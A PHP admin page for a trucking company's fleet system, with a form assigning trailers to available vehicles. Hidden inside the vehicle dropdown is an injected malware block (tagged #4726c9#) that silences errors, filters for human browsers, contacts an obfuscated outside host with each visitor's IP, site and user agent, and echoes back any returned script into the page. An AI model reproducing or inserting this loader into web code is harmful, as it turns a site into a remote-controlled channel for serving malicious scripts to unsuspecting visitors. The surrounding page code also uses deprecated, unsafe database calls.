<?php  	
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	
	include("../conexion/baseDatos.php");
	include("../conexion/config.php");
	date_default_timezone_set("America/Bogota");
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	
	function validar()
	{
		vehiculo = document.getElementById('cmbVehiculo').value;
		carreta = document.getElementById('cmbCarreta').value;
		
		if(vehiculo.length==0 || carreta.length==0)
		{
			alert("¡ No se encuentra algun vehiculo o carreta disponible !");
			return;
		}
		document.getElementById('form1').submit();
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 00000000"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - VehiculoCarreta ::</title>
</head>
<body onLoad="setValoresDefault()">
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="263"><div align="center">
          <form id="form1" name="form1" method="post" action="admin.php">
            <table width="385" border="0">
              <tr>
                <td height="36" colspan="6"><div align="center"><strong>ASIGNAR CARRETA A VEHICULO </strong></div></td>
                </tr>
              <tr>
                <td width="18" height="31">&nbsp;</td>
                <td width="159"><div align="justify"><em><strong>Vehiculo disponible </strong></em>:</div></td>
                <td colspan="3"><div align="justify">
                  <select name="cmbVehiculo" id="cmbVehiculo">
				  	<?php
						$consult = "select placa from vehiculo where activo=1 and estado='disponible';";
						$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
						$bd->conectar();
						$result = $bd->crearConsulta($consult);
						while($reg = mysql_fetch_object($result))
						{
							print("<option value=\"".$reg->placa."\">".$reg->placa."</option>");
						}	
					?>
<?php
#4726c9#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/4726c9#
?>
                  </select>
                  </div></td>
                <td width="7">&nbsp;</td>
              </tr>
              <tr>
                <td height="35">&nbsp;</td>
                <td><div align="justify"><em><strong>Carreta disponible :</strong></em></div></td>
                <td colspan="3"><div align="justify">
                  <select name="cmbCarreta" id="cmbCarreta">
				  		<?php
						$consult = "select placa from carreta where activo=1 and estado='disponible';";
						$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
						$bd->conectar();
						$result = $bd->crearConsulta($consult);
						while($reg = mysql_fetch_object($result))
						{
							print("<option value=\"".$reg->placa."\">".$reg->placa."</option>");
						}	
					?>
                  </select>				  
                  </div></td>				
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td><em><strong>Fecha:</strong></em></td>
                <td width="62"><select name="cmbDia" id="cmbDia">	
					<?php 
					$cont=1;
					$day= date(d);
					while($cont!=32)
					{
						if($day==$cont)
						{
							echo "<option value=\"".$cont."\" selected="."selected".">$cont</option>";	
							$cont++;
							continue;
						}
						echo "<option value=\"".$cont."\">$cont</option>";
						$cont++;
					}
					 ?>			  
                </select>                </td>
                <td width="53"><select name="cmbMes" id="cmbMes">
                  <?php 
					$cont=1;
					$day= date(m);
					while($cont!=13)
					{
						if($day==$cont)
						{
							echo "<option value=\"".$cont."\" selected="."selected".">$cont</option>";	
							$cont++;
							continue;
						}
						echo "<option value=\"".$cont."\">$cont</option>";
						$cont++;
					}
					 ?>		
				   </select>                </td>
                <td width="46"><select name="cmbAnho" id="cmbAnho">
					<?php 
					$cont=2010;
					$day= date(Y);
					while($cont!=2021)
					{
						if($day==$cont)
						{
							echo "<option value=\"".$cont."\" selected="."selected".">$cont</option>";	
							$cont++;
							continue;
						}
						echo "<option value=\"".$cont."\">$cont</option>";
						$cont++;
					}
					 ?>	
                </select>                </td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td>&nbsp;</td>
                <td><div align="center">
                  <input type="button" name="button" value="Asignar" onClick="validar()"/>
				  <input type="hidden" name="op" value="asignarCarretaVehiculo"/>
                </div></td>
                <td colspan="3"><div align="center">
                  <input type="button" name="Submit2" value="Cancelar"  onclick="go()"/>
                </div></td>
                <td>&nbsp;</td>
              </tr>
            </table>
              </form>
          </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>